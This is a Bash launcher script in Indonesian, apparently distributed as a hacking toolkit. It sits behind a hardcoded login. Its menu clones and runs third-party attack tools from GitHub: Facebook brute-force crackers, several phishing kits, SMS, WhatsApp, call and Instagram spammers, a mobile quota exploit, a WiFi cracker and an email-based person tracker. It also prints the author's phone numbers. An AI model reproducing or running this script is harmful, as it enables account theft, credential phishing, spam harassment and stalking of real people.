#!/bin/bash
#############################
#  ALAT KEPERLUAN ONLINE                 #
#############################
clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
echo "\033[34;1m"
echo "\033[32;1m[\033[34;1m•\033[32;1m]\033[31;1m\033[35;1m[\033[32;1mJika gk tau username sama pasword nya    \033[35;1m]\033[31;1m\033[32;1m[\033[34;1m•\033[32;1m]"
echo "\033[32;1m[\033[32;1m•\033[32;1m]\033[31;1m\033[35;1m[\033[32;1mKAMU BISA NANYAK DENGAN YG PUNYA TOOLS   \033[35;1m]\033[31;1m\033[32;1m[\033[34;1m•\033[32;1m]"
echo "\033[32;1m[\033[32;1m•\033[32;1m]\033[31;1m\033[35;1m[\033[32;1mJANGAN DI RECODE YA BANGSAT CAPEK GUA ASW\033[35;1m]\033[31;1m\033[32;1m[\033[34;1m•\033[32;1m]"
echo "     \033[32;1m[\033[34;1m•\033[32;1m]\033[31;1m\033[35;1m[ \033[34;1mKontak wa \033[32;1m: \033[31;1m085836465872 \033[35;1m]\033[31;1m\033[32;1m[\033[34;1m•\033[32;1m]"
echo "\033[33;1m"
read -p " [ Username ]==> : " user
if [ $user = "Riski" ]
then
sleep 1
else
echo "      \033[32;1m[\033[31;1m!\033[32;1m]\033[34;1m----\033[35;1m[ \033[31;1mUsername Salah Kontol\033[35;1m]\033[34;1m----\033[32;1m[\033[31;1m!\033[32;1m]"
sleep 1
clear
sh alat.sh
fi

echo "\033[33;1m"
read -p " [ Password ]==> : " pass
if [ $pass = "Ganteng" ]
then
sleep 1
clear
else
echo "      \033[32;1m[\033[31;1m!\033[32;1m]\033[34;1m----\033[35;1m[ \033[31;1mPassword Salah Kontol\033[35;1m]\033[34;1m----\033[32;1m[\033[31;1m!\033[32;1m]"
sleep 1
clear
sh alat.sh
fi

echo "\033[36;1m[]=====================================================[]"|lolcat
echo "\033[37;1m[] AUTHOR :  RISKI DARMAWAN                            []"|lolcat
echo "\033[35;1m[] W A    :   085836465872                             []"|lolcat
echo "\033[36;1m[] NO HP  : 085835295133                               []"|lolcat
echo "\033[31;1m[] PESAN  : GUNAKAN TOOLS INI DENGAN BIJAK             []"|lolcat
echo "\033[36;1m[]=====================================================[]"|lolcat
echo "\033[36;1m-------=========[ KEPERLUAN ALAT ONLINE ]========---------"|lolcat

                       echo $red"      IlıılıIlılıl MENU IlıılıIlılıl"|lolcat
                       echo $red"               凸冖へ冖凸"|lolcat
                       
         
echo      $red"<©>=========================<®>"
echo      $red"( 1 ) HACK FB NARGET"|lolcat
echo      $green"<©>=========================<®>"
echo      $red"( 2 ) HACK FB MASSAL"|lolcat
echo      $red"<©>=========================<®>"
echo      $red"( 3 ) INSTALL OSIF V.1"|lolcat
echo      $green"<©>=========================<®>"
echo      $red"( 4 ) INSTALL OSIF V.2"|lolcat
echo      $red"<©>=========================<®>"
echo      $red"( 5 ) PHISING FACEBOOK V.1"|lolcat
echo      $green"<©>=========================<®>"
echo      $red"( 6 ) PHISING FACEBOOK V.2"|lolcat
echo      $red"<©>=========================<®>"
echo      $red"( 7 ) PHISING GAME ONLINE"|lolcat
echo      $green"<©>=========================<®>"
echo      $red"( 8 ) PHISING FACEBOOK V.3"|lolcat
echo      $red"<©>=========================<®>"
echo      $red"( 9 ) SPAM SMS"|lolcat
echo      $green"<©>=========================<®>"
echo      $red"( 10 ) SPAM WA + CALL"|lolcat
echo      $red"<©>=========================<®>"
echo      $red"( 11 ) SPAM IG"|lolcat
echo      $green"<©>=========================<®>"
echo      $red"( 12 ) TEMBAK QUOTA XL"|lolcat
echo      $red"<©>=========================<®>"
echo      $red"( 13 ) HACK WIFI (ROOT#GAN)"|lolcat
echo      $green"<©>=========================<®>"
echo      $red"( 14 ) LACAK ORANG DENGAN EMAIL"|lolcat
echo      $red"<©>=========================<®>"
echo      $red"( 15 ) INSTALL BAHAN DULU COK"|lolcat
echo      $green"<©>=========================<®>"
echo      $red"( 16 ) [EXIT/KELUAR]"|lolcat
echo      $red"<©>=========================<®>"
echo "\033[33;1m"
read -p " √={PILIH SESUAI SELERA}===> : " c;

if [ $c = 1 ]
then
clear
git clone https://github.com/Senitopeng/fbbrute.git
cd fbbrute
python2 jomblo.py
fi

if [ $c = 2 ]
then
clear
git clone https://github.com/hnov7/mbf
cd mbf
python2 mbf.py
fi

if [ $c = 3 ]
then
clear
pkg update && pkg upgrade
pip2 install mechanize
pkg install git
pkg install python2
pip2 install requirements.txt
git clone https://github.com/xHak9x/fbi
cd fbi
python2 fbi.py
fi

if [ $c = 4 ]
then
clear
pkg update && pkg upgrade
pkg update upgrade
pkg install git python2
git clone https://github.com/ciku370/OSIF
cd OSIF
python2 osif.py
fi

if [ $c = 5 ]
then
clear
apt update
apt upgrade
git clone https://github.com/thelinuxchoice/shellphish.git
cd shellphish
bash shellphish.sh
fi

if [ $c = 6 ]
then
clear
apt update
apt upgrade
git clone https://github.com/thelinuxchoice/blackeye.git
cd blackeye
bash blackeye.sh
fi

if [ $c = 7 ]
then
clear
apt install python2
apt install apache2
apt install git php unzip
git clone https://github.com/Senitopeng/PhisingOnline.git
cd PhisingOnline
unzip PhisingOnline.zip
python2 online.py
fi

if [ $c = 8 ]
then
clear
apt update
apt upgrade
git clone https://github.com/UndeadSec/SocialFish.git
cd SocialFish
chmod +x *
pip2 install -r requirements.txt
python2 SocialFish.py
fi

if [ $c = 9 ]
then
clear
pip2 install requests
apt install nano
apt install git
git clone https://github.com/Senitopeng/SpamSms.git
cd SpamSms
chmod +x mantan.py 
python2 mantan.py
fi

if [ $c = 10 ]
then
clear
echo $red"KALAU MAU SPAM WA KETIK php wa.php"|lolcat
echo $red"KALAU MAU SPAM CALL KETIK php call.php"|lolcat
apt update -y
apt upgrade -y
apt install git
apt install php
git clone https://github.com/siputra12/prank
cd prank
php wa.php
fi

if [ $c = 11 ]
then
clear
apt update
apt upgrade
apt install git
git clone 
https://github.com/thelinuxchoice/instaspam.git
cd instaspam
bash instaspam.sh
fi

if [ $c = 12 ]
then
clear
pip2 install requests
pkg install python
pkg install git
pip install requests
git clone https://github.com/albertoanggi/xl-py.git
cd xl-py
python app.py
fi

if [ $c = 13 ]
then
clear
apt update + apt upgrade
pkg install git
git clone https://github.com/esc0rtd3w/wifi-hacker
cd wifi-hacker/
chmod +x wifi-hacker.sh
./wifi-hacker.sh
fi

if [ $c = 14 ]
then
clear
$apt update
apt upgrade
pkg install php
pkg install git
pkg install bash
pkg instal curl
git clone https://github.com/thelinuxchoice/infog
cd infog
bash infog.sh
fi

if [ $c = 15 ]
then
clear
pkg update
pkg upgrade
pkg install git
pkg install php
pkg install figlet
pkg install toilet
pkg install python2
pkg install lolcat
pip2 install requests
pip2 install termcolor
pip2 install --upgrade pip
figlet -f slant "SUKSES"|lolcat
sh alat.sh
fi

if [ $c = 16 ]
then
clear
echo $yellow"SELAMAT JALAN HACKER SEMOGA SUKSES SELALU"|lolcat
echo $blue"KALAU MAU MAKAI LAGI SILAHKAN KETIK sh alat.sh"|lolcat
echo $red"SALAM ANAK MEDAN"|lolcat
echo $green"GOOD BY"|lolcat
exit
exit
fi